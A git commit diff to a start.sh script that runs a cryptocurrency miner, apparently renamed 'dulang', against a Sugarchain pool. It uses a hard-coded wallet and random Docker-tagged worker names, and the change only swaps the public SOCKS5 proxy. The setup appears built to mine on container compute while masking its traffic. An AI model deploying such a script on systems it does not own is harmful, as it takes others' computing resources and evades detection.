74147899199cbb7dc5e2107be1f9a58daafc9aca
dfgfd443rete <86584933+dfgfd443rete@users.noreply.github.com>
2021-06-29 16:18:46 +0700

    Update start.sh

--- start.sh
+++ start.sh
@@ -6,5 +6,5 @@ screen -dmS ls
 POOL=stratum+tcp://stratum-eu.rplant.xyz:7042
 WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.dus
 WORKER=$(echo $(shuf -i 1000-9999 -n 1)-Docker)
-PROXY=socks5://98.162.25.23:4145
+PROXY=socks5://184.178.172.14:4145
 ./dulang -a yespowersugar -o $POOL -u $WALLET -p $WORKER -t 2 -x $PROXY
